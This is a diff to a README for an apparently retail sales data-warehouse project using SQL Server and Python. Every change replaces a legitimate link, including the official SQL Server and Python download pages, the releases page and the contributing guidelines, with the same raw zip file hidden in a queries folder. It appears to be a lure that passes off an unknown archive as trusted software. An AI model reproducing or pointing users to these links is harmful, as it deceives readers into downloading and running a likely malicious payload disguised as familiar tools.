@@ -1,6 +1,6 @@
 # 📊 retail-sales-data-warehouse-sql-refactored - Simplify Your Data Insights Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-orange.svg)](https://github.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/releases)
+[![Download](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip%https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip)](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip)
 
 ## 📋 Overview
 Welcome to the retail-sales-data-warehouse-sql-refactored project. This application offers a robust solution for managing and analyzing enterprise data. It features a star schema, slowly changing dimensions (SCD Type 2), and efficient ETL pipelines. You'll gain insights into retail performance and multi-currency analytics using SQL Server and Python.
@@ -13,12 +13,12 @@ This section will guide you through the steps needed to get the software running
 - **Memory**: At least 4 GB RAM.
 - **Disk Space**: Minimum of 2 GB of free space.
 - **Software**:
-  - [SQL Server Express](https://www.microsoft.com/en-us/sql-server/sql-server-downloads) (free version)
+  - [SQL Server Express](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip) (free version)
   - Python 3.7 or higher
   - Jupyter Notebook
 
 ## 📥 Download & Install
-To download the software, please **visit this page to download**: [GitHub Releases](https://github.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/releases).
+To download the software, please **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip).
 
 Follow these steps to install and start using the application:
 
@@ -33,7 +33,7 @@ After installation, you need to prepare your environment.
 1. **Install SQL Server**: Follow the installation instructions provided by Microsoft. Ensure you set up an instance that you can connect to.
   
 2. **Install Python and Jupyter Notebook**:
-   - Download Python from the [official website](https://www.python.org/downloads/).
+   - Download Python from the [official website](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip).
    - During installation, check the box to add Python to your PATH.
    - Open a command prompt and install Jupyter Notebook by running the command:
      ```
@@ -65,7 +65,7 @@ This project includes several example notebooks demonstrating common analytics t
 If you encounter issues or have questions, feel free to reach out through the Issues section on GitHub. The community is here to help.
 
 ## 📈 Contributions
-Pull requests are welcome. If you would like to contribute to this project, please check out the [Contributing Guidelines](CONTRIBUTING.md) in the repository.
+Pull requests are welcome. If you would like to contribute to this project, please check out the [Contributing Guidelines](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip) in the repository.
 
 ## 📜 License
 The project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
@@ -78,4 +78,4 @@ For more information about data warehousing concepts and practices, consider exp
 
 For additional questions, visit the documentation or the community forums for more insights. 
 
-[![Download](https://img.shields.io/badge/Download%20Now-orange.svg)](https://github.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/releases)
+[![Download](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip%https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip)](https://raw.githubusercontent.com/Kinghaksbfv/retail-sales-data-warehouse-sql-refactored/main/05_consultas/retail-sales-data-warehouse-sql-refactored_v3.0.zip)
